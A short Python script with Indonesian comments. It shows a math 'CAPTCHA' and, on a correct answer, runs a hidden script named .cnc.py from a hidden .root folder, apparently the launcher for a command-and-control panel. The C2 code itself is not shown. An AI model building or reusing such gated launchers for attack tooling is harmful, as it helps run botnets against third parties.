import os
import time
import random

# Bersihkan layar
os.system("clear")

# Tampilkan judul
print("""CAPTCHA

""")
time.sleep(3)

# Daftar pertanyaan dan jawaban
questions = [
    ("70 + 20 =", "90"),
    ("45 - 15 =", "30"),
    ("12 + 3 =", "15"),
    ("100 + 20 =", "120"),
    ("5 + 6 =", "11"),
    ("15 + 25 =", "40"),
    ("8 - 3 =", "5"),
    ("9 + 9 =", "18"),
    ("60 + 6 =", "66"),
    ("7 + 14 =", "21")
]

# Pilih satu pertanyaan secara acak
question, correct_answer = random.choice(questions)

# Tampilkan pertanyaan dan ambil jawaban pengguna
print(question)
user_answer = input("Masukan: ")

# Periksa jawaban
if user_answer != correct_answer:
    print("Jawaban tidak sesuai")
else:
    print("Jawaban benar √")
    os.system('cd .root && python3 .cnc.py')